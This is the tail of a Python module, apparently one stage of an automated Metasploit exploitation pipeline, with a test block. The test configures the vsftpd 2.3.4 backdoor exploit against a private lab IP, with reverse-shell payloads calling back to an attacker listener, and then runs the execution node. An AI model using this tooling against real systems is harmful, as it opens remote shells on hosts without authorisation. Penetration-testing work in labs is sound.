        log_node_end(logger, "NODE 5", success=True)
        logger.info("=" * 70)
        logger.info("")
        return state
    else:
        log_node_end(logger, "NODE 5", success=False)
        logger.info("=" * 70)
        logger.info("")
        return state


# For standalone testing
if __name__ == "__main__":
    # Configure logging for testing
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    # Test state
    test_state = {
        "target": "192.168.1.100",
        "port": 21,
        "lhost": "192.168.1.50",
        "lport": 4444,
        "selected_exploits": [
            {
                "path": "exploit/unix/ftp/vsftpd_234_backdoor",
                "name": "VSFTPD 2.3.4 Backdoor",
                "rank": "excellent",
                "final_score": 1250
            }
        ],
        "current_exploit_index": 0,
        "payloads_to_try": [
            "cmd/unix/interact",
            "linux/x64/shell/reverse_tcp",
            "cmd/unix/reverse_bash"
        ],
        "current_payload_index": 0
    }

    print("\n" + "=" * 70)
    print("TESTING NODE 5: EXPLOIT EXECUTION & SESSION MANAGEMENT")
    print("=" * 70 + "\n")

    # Note: Requires actual MSF connection to work
    result_state = node_5_exploit_execution(test_state)

    print("\n" + "=" * 70)
    print("RESULTS:")
    print("=" * 70)
    print(f"Execution attempts: {result_state.get('execution_attempts', 0)}")
    print(f"Successful payloads: {len(result_state.get('successful_payloads', []))}")
    print(f"Failed payloads: {len(result_state.get('failed_payloads', []))}")
    print(f"Error: {result_state.get('error', 'None')}")
    print("=" * 70 + "\n")
